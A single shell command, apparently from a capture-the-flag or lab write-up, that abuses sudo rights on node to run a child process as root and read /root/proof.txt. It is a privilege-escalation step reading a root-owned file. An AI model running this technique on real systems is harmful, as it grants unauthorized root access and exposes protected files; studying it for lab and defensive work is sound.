```
:~$ sudo -u root node -e 'var exec = require("child_process").exec;exec("cat /root/proof.txt", function(error, stdOut, stdErr){console.log(stdOut);});'
```

